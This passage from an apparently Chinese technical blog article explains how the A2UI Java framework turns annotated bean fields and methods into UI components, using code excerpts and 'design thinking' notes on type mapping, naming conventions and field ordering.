    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">CustomAnnotation</span>&gt; customAnnotationMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    int index = <span class="hljs-number">0</span>;

    <span class="hljs-comment">// 并行处理字段初始化</span>
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Callable</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt;&gt; fieldTasks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : allCtFields) {
        fieldTasks.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitFieldTask</span>&lt;&gt;(field, index, <span class="hljs-variable language_">this</span>));
        index++;
    }
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt; fields = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">invokFieldTasks</span>(className, fieldTasks);

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">BridgeFieldConfig</span> fieldInfo : fields) {
        <span class="hljs-title class_">Field</span> field = fieldInfo.<span class="hljs-property">field</span>;
        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isSerialize</span>()) {
            fieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            esdFieldMap.<span class="hljs-title function_">put</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>(), fieldInfo);
            fieldNameList.<span class="hljs-title function_">add</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>());
        } <span class="hljs-keyword">else</span> {
            disableFieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            disableFieldList.<span class="hljs-title function_">add</span>(fieldInfo);
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isUid</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">uid</span> = field.<span class="hljs-title function_">getName</span>();
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isCaptionField</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">captionField</span> = fieldInfo;
        }
    }
}
</code></pre>
<h4 data-id="heading-9">设计思考：</h4>
<ol>
<li><strong>为什么使用LinkedHashMap而不是HashMap？</strong>
<ul>
<li>LinkedHashMap保持插入顺序</li>
<li>保证字段的显示顺序与声明顺序一致</li>
<li>提供确定性的字段顺序</li>
</ul>
</li>
<li><strong>为什么区分fieldMap和disableFieldMap？</strong>
<ul>
<li>fieldMap：需要序列化和显示的字段</li>
<li>disableFieldMap：不需要显示的字段（如隐藏字段、系统字段）</li>
<li>分离关注点，提高处理效率</li>
</ul>
</li>
<li><strong>为什么使用并行处理？</strong>
<ul>
<li>字段初始化是CPU密集型操作</li>
<li>并行处理可以显著提高性能</li>
<li>特别是在字段数量较多时</li>
</ul>
</li>
</ol>
<h4 data-id="heading-10">阶段4：方法拆解阶段</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1b12def00994a139fa1a34e344d2904~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=t0EqQdb9%2BqNlIwkKw3WlRQNIdgU%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title class_">BridgeMethodConfig</span>(<span class="hljs-title class_">Method</span> method, <span class="hljs-title class_">BridgeClass</span> bridgeClass) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">innerMethod</span> = method;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">returnType</span> = method.<span class="hljs-title function_">getReturnType</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">domainId</span> = bridgeClass.<span class="hljs-title function_">getDomainId</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bridgeClass</span> = bridgeClass;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">methodName</span> = method.<span class="hljs-title function_">getName</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldName</span> = <span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">getFieldName</span>(method);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">innerMethod</span> = method;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = fieldName;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = fieldName;

    <span class="hljs-title class_">String</span> fieldName = <span class="hljs-title class_">MethodUtil</span>.<span class="hljs-title function_">getFieldName</span>(method);

    <span class="hljs-comment">// 查找对应的字段</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> fieldInfo : <span class="hljs-variable language_">this</span>.<span class="hljs-property">bridgeClass</span>.<span class="hljs-title function_">getAllCtFields</span>()) {
        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">equals</span>(fieldName)) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">field</span> = fieldInfo;
            <span class="hljs-keyword">continue</span>;
        }
    }

    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (returnType.<span class="hljs-title function_">isArray</span>() || <span class="hljs-title class_">Collection</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(returnType)) {
            <span class="hljs-title class_">Class</span> innerClass = <span class="hljs-title class_">JSON</span>GenUtil.<span class="hljs-title function_">getInnerReturnType</span>(method);
            <span class="hljs-keyword">if</span> (innerClass != <span class="hljs-literal">null</span>) {
                returnType = innerClass;
            }
        }
        <span class="hljs-title function_">init</span>(index, bridgeClass);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getRefBean</span>() != <span class="hljs-literal">null</span>) {
            <span class="hljs-title class_">CustomRefMeta</span> ref = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getRefBean</span>();
            <span class="hljs-keyword">if</span> (ref.<span class="hljs-title function_">getView</span>() != <span class="hljs-literal">null</span> &amp;&amp; ref.<span class="hljs-title function_">getView</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">ViewType</span>.<span class="hljs-property">DIC</span>)) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
            }
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">refType</span> = ref.<span class="hljs-title function_">getRef</span>();
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">viewType</span> = ref.<span class="hljs-title function_">getView</span>();
        }

        <span class="hljs-keyword">if</span> (componentType == <span class="hljs-literal">null</span>) {
            componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
        e.<span class="hljs-title function_">printStackTrace</span>();
    }

    <span class="hljs-comment">// 检查是否为模块方法</span>
    <span class="hljs-title class_">ModuleAnnotation</span> annotation = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getMethodAnnotation</span>(method, <span class="hljs-title class_">ModuleAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (annotation != <span class="hljs-literal">null</span>) {
        isModule = <span class="hljs-literal">true</span>;
    }

    <span class="hljs-title class_">ModuleRefFieldAnnotation</span> comboModuleAnnotation = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getMethodAnnotation</span>(method, <span class="hljs-title class_">ModuleRefFieldAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (comboModuleAnnotation != <span class="hljs-literal">null</span>) {
        isModule = <span class="hljs-literal">true</span>;
    }

    <span class="hljs-title class_">APIEventAnnotation</span> apiEventAnnotation = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getMethodAnnotation</span>(method, <span class="hljs-title class_">APIEventAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (apiEventAnnotation != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">CustomMenuItem</span> menuItem : apiEventAnnotation.<span class="hljs-title function_">bindMenu</span>()) {
            <span class="hljs-keyword">if</span> (!menuItem.<span class="hljs-title function_">getReturnView</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">ModuleViewType</span>.<span class="hljs-property">NONE</span>) &amp;&amp; menuItem.<span class="hljs-title function_">getDefaultView</span>()) {
                isModule = <span class="hljs-literal">true</span>;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-11">设计思考：</h4>
<ol>
<li><strong>为什么需要查找对应的字段？</strong>
<ul>
<li>方法可能对应某个字段的Getter/Setter</li>
<li>字段的注解可以补充方法的元数据</li>
<li>支持字段和方法的协同工作</li>
</ul>
</li>
<li><strong>为什么需要处理数组和集合类型？</strong>
<ul>
<li>数组和集合需要获取内部类型</li>
<li>内部类型决定UI组件类型</li>
<li>支持泛型类型的正确处理</li>
</ul>
</li>
<li><strong>为什么需要检查是否为模块方法？</strong>
<ul>
<li>模块方法返回的是UI组件</li>
<li>需要特殊处理模块方法的渲染</li>
<li>支持动态UI组件的生成</li>
</ul>
</li>
</ol>
<h4 data-id="heading-12">阶段5：类型映射阶段</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a63eb31301ce453e9589699481fa4e4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=QE0lCgRQRkwZOuh%2B5%2BC%2FvatyUKs%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">static</span> <span class="hljs-title class_">ComponentType</span> <span class="hljs-title function_">getComponentType</span>(<span class="hljs-params">Class typeClass, Type type</span>) {
    <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">JSON</span>GenUtil.<span class="hljs-title function_">getInnerType</span>(type);

    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Enumstype</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(clazz) || clazz.<span class="hljs-title function_">isEnum</span>()) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (typeClass != <span class="hljs-literal">null</span> &amp;&amp; (typeClass.<span class="hljs-title function_">isArray</span>() || <span class="hljs-title class_">Collection</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(typeClass))) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(customClass).<span class="hljs-title function_">contains</span>(clazz) || typeClass.<span class="hljs-title function_">equals</span>(clazz)) {
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>;
        }
    }

    <span class="hljs-keyword">if</span> (java.<span class="hljs-property">sql</span>.<span class="hljs-property">Date</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(clazz)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(short.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Short</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(int.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Integer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(boolean.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Boolean</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">CHECKBOX</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(long.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Long</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(float.<span class="hljs-property">class</span>) || clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Float</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">BigDecimal</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">BigInteger</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Reader</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">if</span> (clazz.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">StringBuffer</span>.<span class="hljs-property">class</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">RICHEDITOR</span>;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>;
}
</code></pre>
<h4 data-id="heading-13">设计思考：</h4>
<ol>
<li><strong>为什么需要处理泛型类型？</strong>
<ul>
<li>泛型类型在编译时会被擦除</li>
<li>需要通过反射获取实际类型</li>
<li>支持泛型集合的正确映射</li>
</ul>
</li>
<li><strong>为什么Boolean映射到CHECKBOX而不是INPUT？</strong>
<ul>
<li>CHECKBOX更符合布尔值的语义</li>
<li>提供更好的用户体验</li>
<li>减少用户输入错误</li>
</ul>
</li>
<li><strong>为什么StringBuffer映射到RICHEDITOR？</strong>
<ul>
<li>StringBuffer通常用于存储长文本</li>
<li>RICHEDITOR支持富文本编辑</li>
<li>提供更好的文本编辑体验</li>
</ul>
</li>
</ol>
<h4 data-id="heading-14">阶段6：组件生成阶段</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4abbe19e437f4ff492d454fadc01a1a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=vUYLyq6fU2yFFG6SrDBuJye2n%2FU%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title function_">C2UConfigFactory</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Class</span>?&gt;&gt; allClassMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    allClassMap.<span class="hljs-title function_">putAll</span>(<span class="hljs-title class_">EsbBeanFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">getAllClass</span>());
    <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Class</span>?&gt;&gt;&gt; allClass = allClassMap.<span class="hljs-title function_">entrySet</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Class</span>?&gt;&gt; clazzEntry : allClass) {
        <span class="hljs-title class_">Class</span> clazz = clazzEntry.<span class="hljs-title function_">getValue</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title function_">initClass</span>(clazz);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Throwable</span> e) {
            <span class="hljs-comment">// 忽略初始化失败的类</span>
        }
    }
}

<span class="hljs-keyword">void</span> <span class="hljs-title function_">initClass</span>(<span class="hljs-params">Class beanClazz</span>) {
    <span class="hljs-title class_">CustomClass</span> customClass = (<span class="hljs-title class_">CustomClass</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">CustomClass</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CustomBean</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(beanClazz) &amp;&amp; customClass != <span class="hljs-literal">null</span>) {
        <span class="hljs-title class_">AnnotationType</span> ann = (<span class="hljs-title class_">AnnotationType</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">AnnotationType</span>.<span class="hljs-property">class</span>);
        viewTypeAnnMap.<span class="hljs-title function_">put</span>(ann.<span class="hljs-title function_">clazz</span>(), customClass);
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">UIComponent</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(customClass.<span class="hljs-title function_">clazz</span>())) {
            <span class="hljs-keyword">switch</span> (customClass.<span class="hljs-title function_">viewType</span>()) {
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMPONENT</span>:
                    <span class="hljs-title class_">WidgetMetaMap</span>.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), beanClazz);
                    widgetComponentMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), customClass.<span class="hljs-title function_">clazz</span>());
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMBOBOX</span>:
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                            comboBoxAnnMap.<span class="hljs-title function_">put</span>(inputType, ann.<span class="hljs-title function_">clazz</span>());
                            comboBoxComponentMap.<span class="hljs-title function_">put</span>(inputType, customClass.<span class="hljs-title function_">clazz</span>());
                        }
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }

                    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                        comboBoxBeanMap.<span class="hljs-title function_">put</span>(inputType, beanClazz);
                    }
                    <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-15">设计思考：</h4>
<ol>
<li><strong>为什么需要扫描所有类？</strong>
<ul>
<li>自动发现所有UI组件</li>
<li>避免手动注册组件</li>
<li>支持组件的热插拔</li>
</ul>
</li>
<li><strong>为什么使用Map存储组件映射？</strong>
<ul>
<li>快速查找组件类</li>
<li>O(1)时间复杂度</li>
<li>提高组件创建效率</li>
</ul>
</li>
<li><strong>为什么需要区分COMPONENT和COMBOBOX？</strong>
<ul>
<li>COMPONENT：独立组件（如Input、Checkbox）</li>
<li>COMBOBOX：下拉组件（如Date、Number）</li>
<li>不同的组件类型有不同的渲染逻辑</li>
</ul>
</li>
</ol>
<h2 data-id="heading-16">确定性来源分析</h2>
<p>A2UI的确定性来自以下五个层次，每个层次都有其特定的确定性保障机制。</p>
<h3 data-id="heading-17">1. 注解层确定性</h3>
<p>注解是A2UI确定性的第一层保障，通过注解提供明确的元数据。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e11fa9bb90457197559de294fd611d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=3axOZ4m2lSPDCeCiAcKfvsnppC8%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>注解确定性示例：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">@<span class="hljs-title class_">CustomAnnotation</span>(
    caption = <span class="hljs-string">"用户名"</span>,
    uid = <span class="hljs-literal">true</span>,
    readonly = <span class="hljs-literal">true</span>,
    required = <span class="hljs-literal">true</span>
)
private <span class="hljs-title class_">String</span> username;

<span class="hljs-comment">// 确定性分析：</span>
<span class="hljs-comment">// 1. caption明确字段的显示名称</span>
<span class="hljs-comment">// 2. uid明确字段为主键</span>
<span class="hljs-comment">// 3. readonly明确字段为只读</span>
<span class="hljs-comment">// 4. required明确字段为必填</span>
</code></pre>
<h4 data-id="heading-18">设计思考：</h4>
<ol>
<li><strong>为什么注解能提供确定性？</strong>
<ul>
<li>注解是编译时元数据，不会在运行时改变</li>
<li>注解的值是明确的字符串或枚举</li>
<li>注解的解析规则是固定的</li>
</ul>
</li>
<li><strong>为什么需要这么多注解？</strong>
<ul>
<li>不同的注解对应不同的字段属性</li>
<li>支持灵活的字段配置</li>
<li>满足不同的业务场景</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">2. 类型层确定性</h3>
<p>Java类型系统是A2UI确定性的第二层保障，通过类型映射提供组件选择的确定性。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b1e7a4f3dcd45d0945fed256a7be5c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=T2C4FtlQUY03YY9bYpA%2F9gQcg1k%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>类型确定性示例：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">private <span class="hljs-title class_">Boolean</span> isActive;  <span class="hljs-comment">// -&gt; CHECKBOX</span>
private <span class="hljs-title class_">Integer</span> age;      <span class="hljs-comment">// -&gt; COMBOINPUT</span>
private <span class="hljs-title class_">Date</span> birthday;    <span class="hljs-comment">// -&gt; COMBOINPUT</span>
private <span class="hljs-title class_">UserStatus</span> status; <span class="hljs-comment">// -&gt; COMBOINPUT (Enum)</span>
private <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; tags; <span class="hljs-comment">// -&gt; LIST</span>

<span class="hljs-comment">// 确定性分析：</span>
<span class="hljs-comment">// 1. Boolean类型必然映射到CHECKBOX</span>
<span class="hljs-comment">// 2. Integer类型必然映射到COMBOINPUT</span>
<span class="hljs-comment">// 3. Date类型必然映射到COMBOINPUT</span>
<span class="hljs-comment">// 4. Enum类型必然映射到COMBOINPUT</span>
<span class="hljs-comment">// 5. Collection类型必然映射到LIST</span>
</code></pre>
<h4 data-id="heading-20">设计思考：</h4>
<ol>
<li><strong>为什么类型能提供确定性？</strong>
<ul>
<li>Java类型系统是静态的，编译时确定</li>
<li>类型的继承关系是明确的</li>
<li>类型映射规则是固定的</li>
</ul>
</li>
<li><strong>为什么需要区分基本类型和包装类型？</strong>
<ul>
<li>基本类型和包装类型在反射中处理不同</li>
<li>包装类型支持null值</li>
<li>基本类型有默认值</li>
</ul>
</li>
</ol>
<h3 data-id="heading-21">3. 命名约定层确定性</h3>
<p>Java Bean命名约定是A2UI确定性的第三层保障，通过命名约定提供方法识别的确定性。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1ea4f17a559438ba74c672df94e6a99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=U7cHel5sOkegxqwi0YQ%2Bhx%2F5xr8%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>命名约定确定性示例：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> name;
}  <span class="hljs-comment">// -&gt; fieldName = "name"</span>

public <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUserName</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> userName;
}  <span class="hljs-comment">// -&gt; fieldName = "userName"</span>

public boolean <span class="hljs-title function_">isActive</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> active;
}  <span class="hljs-comment">// -&gt; fieldName = "active"</span>

public <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span>(<span class="hljs-params">Integer age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}  <span class="hljs-comment">// -&gt; fieldName = "age"</span>

<span class="hljs-comment">// 确定性分析：</span>
<span class="hljs-comment">// 1. getName()必然对应name字段</span>
<span class="hljs-comment">// 2. getUserName()必然对应userName字段</span>
<span class="hljs-comment">// 3. isActive()必然对应active字段</span>
<span class="hljs-comment">// 4. setAge()必然对应age字段</span>
</code></pre>
<h4 data-id="heading-22">设计思考：</h4>
<ol>
<li><strong>为什么命名约定能提供确定性？</strong>
<ul>
<li>Java Bean规范是业界标准</li>
<li>命名规则是明确的</li>
<li>方法名到字段名的映射是固定的</li>
</ul>
</li>
<li><strong>为什么需要支持多种命名模式？</strong>
<ul>
<li>支持标准的Getter/Setter</li>
<li>支持Boolean的isXxx模式</li>
<li>支持驼峰命名转换</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">4. 索引层确定性</h3>
<p>索引属性是A2UI确定性的第四层保障，通过索引保证字段顺序的确定性。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4f842ee622a4ecfad9740ef52a62f9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=fZrx%2BFa6joZcbFb%2B%2FLBj%2FHTzXmw%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>索引确定性示例：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserForm</span> {
    private <span class="hljs-title class_">String</span> name;        <span class="hljs-comment">// index = 0</span>
    private <span class="hljs-title class_">Integer</span> age;       <span class="hljs-comment">// index = 1</span>
    private <span class="hljs-title class_">Date</span> birthday;     <span class="hljs-comment">// index = 2</span>
    private <span class="hljs-title class_">Boolean</span> active;    <span class="hljs-comment">// index = 3</span>

    @<span class="hljs-title class_">CustomAnnotation</span>(index = <span class="hljs-number">10</span>)
    private <span class="hljs-title class_">String</span> email;      <span class="hljs-comment">// index = 10 (自定义索引)</span>
}

<span class="hljs-comment">// 确定性分析：</span>
<span class="hljs-comment">// 1. name字段必然在第一个位置</span>
<span class="hljs-comment">// 2. age字段必然在第二个位置</span>
<span class="hljs-comment">// 3. birthday字段必然在第三个位置</span>
<span class="hljs-comment">// 4. active字段必然在第四个位置</span>
<span class="hljs-comment">// 5. email字段必然在第十个位置（自定义索引）</span>
</code></pre>
<h4 data-id="heading-24">设计思考：</h4>
<ol>
<li><strong>为什么索引能提供确定性？</strong>
<ul>
